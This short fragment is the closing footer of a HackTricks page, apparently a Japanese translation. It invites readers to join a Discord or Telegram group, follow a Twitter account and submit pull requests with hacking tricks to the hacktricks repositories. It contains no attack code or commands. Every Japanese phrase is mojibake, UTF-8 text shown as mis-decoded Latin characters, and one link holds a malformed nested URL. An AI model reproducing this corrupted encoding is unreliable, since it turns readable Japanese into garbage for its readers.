* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
